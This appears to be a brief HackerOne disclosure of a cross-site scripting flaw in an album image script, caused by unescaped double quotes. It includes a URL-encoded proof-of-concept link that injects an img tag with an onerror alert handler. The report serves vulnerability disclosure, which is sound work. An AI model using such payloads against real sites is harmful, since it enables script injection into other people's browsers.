# HackerOne Report: Album image XSS
**Report ID:** 17235
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
There's an XSS in the album script caused by insufficient escaping of double quotes.

PoC:

https://staging.uzbey.com/album/image/679/1139%22%3E%3Ch1%3ESurprise!%3Cimg%20src=0%20onerror=%22alert(document.domain)%22%3E

## Discussion & Remediation Timeline
